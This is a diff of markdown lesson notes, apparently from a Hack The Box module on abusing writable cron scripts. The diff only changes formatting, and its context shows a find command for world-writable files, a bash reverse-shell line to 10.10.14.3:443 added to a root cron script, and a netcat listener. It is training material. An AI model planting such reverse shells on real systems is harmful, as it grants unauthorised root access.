@@ -6,7 +6,7 @@ The root crontab is almost always only editable by the root user or a user with 
 
 Certain applications create cron files in the `/etc/cron.d` directory and may be misconfigured to allow a non-root user to edit them.
 
-**First, let's look around the system for any writeable files or directories. The file backup.sh in the /dmz-backups directory is interesting and seems like it could be running on a cron job.**
+**First, let's look around the system for any writeable files or directories. The file `backup.sh` in the `/dmz-backups` directory is interesting and seems like it could be running on a cron job.**
 ```
 victim@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
 
@@ -115,7 +115,7 @@ tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 bash -i >& /dev/tcp/10.10.14.3/443 0>&1
 ```
 
-We modify the script, stand up a local netcat listener, and wait. Sure enough, within three minutes, we have a root shell!
+We modify the script, stand up a local `netcat` listener, and wait. Sure enough, within three minutes, we have a root shell!
 ```
 victim@htb[/htb]$ nc -lnvp 443
 
